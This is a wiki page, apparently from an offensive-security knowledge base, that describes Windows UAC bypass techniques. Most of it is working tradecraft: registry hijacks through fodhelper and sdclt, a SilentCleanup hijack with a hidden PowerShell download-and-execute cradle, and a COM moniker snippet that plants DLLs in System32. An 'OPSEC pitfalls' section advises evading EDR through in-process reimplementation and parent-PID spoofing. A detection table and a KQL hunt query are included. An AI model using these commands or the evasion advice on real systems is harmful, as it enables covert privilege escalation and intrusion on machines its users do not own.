---
title: UAC bypass techniques
slug: uac-bypass-techniques
aliases: [uac-bypass, windows-uac-bypass]
---
{% raw %}

User Account Control (UAC) is the prompt that asks "do you want to allow this app to make changes?" — and the silent split-token machinery behind it. On a default Windows 10/11 install, a local admin runs at Medium Integrity Level (IL) with a filtered token; only when the consent prompt is satisfied does the process receive its full High IL token. UAC bypasses elevate from Medium to High **without** triggering that prompt, by abusing auto-elevated binaries Microsoft ships with `autoElevate=true` in their manifest. Microsoft has stated repeatedly that UAC is not a security boundary, and refuses to service most bypasses — which is precisely why every modern operator playbook still ships a fresh one. See [[user-account-control]] for the underlying model.

## Mental model

Three primitives matter:

1. **Auto-elevation whitelist.** Signed Microsoft binaries in `\Windows\System32` whose embedded manifest contains `<autoElevate>true</autoElevate>` (fodhelper, computerdefaults, sdclt, eventvwr, CompMgmtLauncher, ...) silently get a High IL token if launched from an admin Medium-IL process.
2. **Hijackable lookups.** Those binaries read state from places a Medium-IL user can write — `HKCU\Software\Classes\...` (ShellExecute protocol handler lookup checks HKCU before HKCR), environment variables, side-loaded DLL search paths.
3. **COM elevation moniker.** `IFileOperation` and the `Elevation:Administrator!new:{CLSID}` moniker let a Medium process instantiate a High-IL COM server. With the right CLSID (`{3AD05575-8857-4850-9277-11B85BDB8E09}` IFileOperation, `{D2E7041B-2927-42fb-8E9F-7CE93B6DC937}` ColorDataProxy) you can write to protected paths or load a DLL into a High-IL host.

The hijack flow for `fodhelper.exe`:

```
fodhelper.exe (High IL, auto-elevated)
   └── ShellExecute("ms-settings:")
         └── lookup ms-settings\shell\open\command
              ├── HKCU\Software\Classes\ms-settings\... <-- attacker writes here
              └── HKCR fallback (legit handler)
```

Because HKCU wins, the attacker-controlled command runs as the elevated child of `fodhelper.exe`.

## Tradecraft

### Registry hijack: fodhelper (still works on 11 23H2 with a `DelegateExecute` twist)

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c whoami > %TEMP%\uac.txt" /f
start "" fodhelper.exe
reg delete "HKCU\Software\Classes\ms-settings" /f
```

The empty `DelegateExecute` value is required on 11 — without it the call falls through to the protocol-activation pipeline that ignores HKCU.

### computerdefaults.exe / sdclt.exe variants

```cmd
:: computerdefaults — same ms-settings handler, different launcher (cleaner Sysmon parent chain in some EDRs)
start "" computerdefaults.exe

:: sdclt.exe /KickOffElev reads HKCU\Software\Classes\Folder\shell\open\command
reg add "HKCU\Software\Classes\Folder\shell\open\command" /ve /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
sdclt.exe /KickOffElev
```

### Env-var hijack: SilentCleanup scheduled task

The built-in `\Microsoft\Windows\DiskCleanup\SilentCleanup` task runs `%windir%\system32\cleanmgr.exe` as the user but with **highest privileges**. The token comes from the user, but `windir` is read from the user's environment block.

```powershell
[Environment]::SetEnvironmentVariable("windir","cmd /c start powershell -nop -w hidden -c IEX(IWR https://x/y);#", "User")
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup"
# clean up
[Environment]::SetEnvironmentVariable("windir",$null,"User")
```

The `#` comments out the rest of the original command. Works without a registry write to `HKCU\Software\Classes`, which is a heavily monitored surface.

### DLL hijack of auto-elevated binaries

Many auto-elevated binaries side-load DLLs from writable locations under `%LOCALAPPDATA%\Microsoft\WindowsApps` or accept relative paths. `wusa.exe`, `slui.exe`, `msconfig.exe`, and several MMC snap-ins have had abusable load orders. See [[dll-hijacking-privesc]] for the search-order theory; the UAC-specific twist is choosing a target whose manifest auto-elevates **and** whose missing import you can plant. The current canonical catalogue is **UACME by hfiref0x** (commit 3.7.x, ~80 methods), which is the practitioner reference — read the source, don't ship the binary, it is 100% signatured.

### IFileOperation COM moniker

```cpp
CoGetObject(L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}",
            &bo, IID_IFileOperation, (void**)&pfo);
pfo->CopyItem(srcDll, sysFolder, L"target.dll", NULL);
```

Bind to the elevated `IFileOperation`, copy your payload DLL into `C:\Windows\System32\`, then trigger an auto-elevated binary that imports it. The classic chain (Leo Davidson / `Win32/Bypassuac`) still functions; modern EDRs flag the moniker string itself.

### Token impersonation paths

Not strictly UAC, but it ends in the same place: if you already have `SeImpersonatePrivilege` (IIS, MSSQL, any service account), Potato-family exploits (RoguePotato, PrintSpoofer, GodPotato on 11) coerce a SYSTEM auth to a named pipe you control and call `ImpersonateNamedPipeClient`. See [[token-impersonation]]. This often beats UAC bypass for service-context footholds — no admin user required.

## Detection / Telemetry

| Signal | Source | Notes |
|---|---|---|
| `HKCU\Software\Classes\ms-settings` write | Sysmon EID 13, EDR registry sensor | Almost zero legit reasons; high-fidelity |
| `fodhelper.exe` / `computerdefaults.exe` with child `cmd.exe`/`powershell.exe` | EID 4688, Sysmon EID 1 | Parent-child anomaly, near-zero baseline |
| Auto-elevated binary loading unsigned DLL | Sysmon EID 7 (ImageLoad) | Hunt `IsSigned=false` on `slui/wusa/msconfig` |
| Env var `windir` set in HKCU\Environment | Sysmon EID 13, EID 4657 | SilentCleanup precursor |
| `SilentCleanup` task run from interactive session | EID 4698/4702 + EID 200/201 in `TaskScheduler/Operational` | Followed by elevated child of `svchost` |
| COM `Elevation:Administrator!new:` string in memory | EDR string scan | Catches IFileOperation moniker abuse |

Hunt query (KQL / Defender for Endpoint):

```kql
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("fodhelper.exe","computerdefaults.exe","sdclt.exe","slui.exe")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","rundll32.exe","mshta.exe","wscript.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
```

## OPSEC pitfalls

- **Every public UACME method is signatured.** Shipping the UACME binary or its strings (`"Akagi"`, hardcoded CLSIDs) is an instant kill. Reimplement in-process.
- **Registry cleanup is mandatory.** Leaving `HKCU\Software\Classes\ms-settings` behind is a beacon for IR sweeps and breaks the user's Settings app — both noisy.
- **Don't elevate cmd.exe directly.** Spawning `cmd.exe`/`powershell.exe` as a child of `fodhelper.exe` is the textbook detection. Inject into a longer-lived elevated process or use [[parent-pid-spoofing]] to launder the parent chain; see also [[process-injection-techniques]].
- **AlwaysNotify breaks most of this.** If the user runs UAC at the highest slider, auto-elevation is disabled and the whole family fails — confirm `ConsentPromptBehaviorAdmin` and `EnableLUA` first via `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System`.
- **Not a domain-admin path.** UAC bypass only matters on the local box, and only if the current user is in the local Administrators group with a filtered token. On standard-user sessions you need a real LPE — see [[windows-privesc-checklist]].

## References

- https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works
- https://github.com/hfiref0x/UACME
- https://attack.mitre.org/techniques/T1548/002/
- https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea
- https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html
- https://www.fortinet.com/blog/threat-research/uac-bypass-techniques-used-by-malware

See also: [[user-account-control]] · [[token-impersonation]] · [[dll-hijacking-privesc]] · [[parent-pid-spoofing]] · [[process-injection-techniques]] · [[living-off-the-land]] · [[windows-privesc-checklist]]
{% endraw %}
